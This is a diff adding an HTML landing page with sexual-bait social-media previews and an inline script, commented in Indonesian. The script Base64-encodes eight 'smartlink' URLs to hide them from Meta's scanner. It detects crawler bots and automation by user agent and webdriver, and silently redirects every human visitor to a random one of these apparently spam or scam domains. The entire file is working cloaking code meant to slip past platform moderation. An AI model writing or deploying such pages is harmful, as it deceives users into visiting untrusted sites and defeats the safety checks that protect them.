@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Online Now...👄💦</title>
+    <meta name="description" content="Online Now...👄💦">
+    <meta name="robots" content="index, follow, max-image-preview:large">
+    
+    <!-- Open Graph Tags (HANYA 1 LINK FOTO DI BAWAH INI UNTUK PREVIEW THREADS/META) -->
+    <meta property="og:title" content="Online Now...👄💦">
+    <meta property="og:description" content="Online Now...👄💦">
+    <meta property="og:image" content="https://raw.githubusercontent.com/Priscilla2026/images/refs/heads/main/uploads/6a7c7a8d2e81a-1786542733.jpg">
+    <meta property="og:image:secure_url" content="https://raw.githubusercontent.com/Priscilla2026/images/refs/heads/main/uploads/6a7c7a8d2e81a-1786542733.jpg">
+    <meta property="og:image:type" content="image/jpeg">
+    <meta property="og:type" content="website">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Online Now...👄💦">
+    <meta name="twitter:description" content="Online Now...👄💦">
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/Priscilla2026/images/refs/heads/main/uploads/6a7c7a8d2e81a-1786542733.jpg">
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { width: 100%; height: 100%; background-color: #000; overflow: hidden; }
+    </style>
+
+    <script>
+        // =========================================================================
+        // WADAH 8 SMARTLINK (KHUSUS UNTUK MENARUH LINK SMARTLINK / TARGET REDIRECT)
+        // =========================================================================
+        const rawSmartlinks = [
+            "https://ella-538248.gules.sbs/b/1QJFY5Yv5Jfoqmqgf",                       // <--- Smartlink 1
+            "https://helena-362390.gules.sbs/b/Uum4bCbWsU8osxgeEv-_wuCf",              // <--- Smartlink 2
+            "https://emily-360063.gules.sbs/b/NHgwygUlDUdO",                           // <--- Smartlink 3
+            "https://vicky-999128.gules.sbs/b/4WhIQ69GXtYFIlgo3IRBDOl",                 // <--- Smartlink 4
+            "https://isabel-267948.yolast.quest/b/ZhhTFrZp5ltWi",                      // <--- Smartlink 5
+            "https://laura-773005.gerdow.eu.org/b/lwAwfLmI-Lb",                         // <--- Smartlink 6
+            "https://danielle-685591.usslinkin.bingo/b/IOz6U9kuhwMv9Qx",               // <--- Smartlink 7
+            "https://ashley-236625.usslinkin.bingo/b/N9DmPVrKAOQw4QvKvaTcJXF7b"        // <--- Smartlink 8
+        ];
+
+        // Enkripsi otomatis ke Base64 di memori browser agar tidak terbaca scanner Meta
+        const encodedLinks = rawSmartlinks.map(url => btoa(url));
+
+        // =========================================================================
+        // FILTER BOT CRAWLER THREADS/META (CLOAKING AGAR LINK TIDAK HILANG / BANNED)
+        // =========================================================================
+        function checkBot() {
+            const ua = navigator.userAgent.toLowerCase();
+            const botKeywords = [
+                'facebookexternalhit', 'facebot', 'threads', 'meta-externalagent',
+                'twitterbot', 'googlebot', 'bingbot', 'slurp', 'duckduckbot',
+                'baiduspider', 'yandexbot', 'headlesschrome', 'phantomjs', 'selenium'
+            ];
+            for (let i = 0; i < botKeywords.length; i++) {
+                if (ua.indexOf(botKeywords[i]) !== -1) return true;
+            }
+            return navigator.webdriver || false;
+        }
+
+        // =========================================================================
+        // AUTO REDIRECT KILAT (INSTANT REDIRECT KETIKA DIKLIK MANUSIA)
+        // =========================================================================
+        (function fastExec() {
+            // Jika yang membuka Bot Threads/Meta, tahan redirect agar preview gambar aman
+            if (checkBot()) return;
+
+            // Ambil secara acak 1 dari 8 Smartlink di atas
+            const randomB64 = encodedLinks[Math.floor(Math.random() * encodedLinks.length)];
+            const targetUrl = atob(randomB64);
+
+            // Eksekusi redirect kilat seketika tanpa delay/tampilan
+            window.location.replace(targetUrl);
+        })();
+    </script>
+</head>
+<body>
+</body>
+</html>
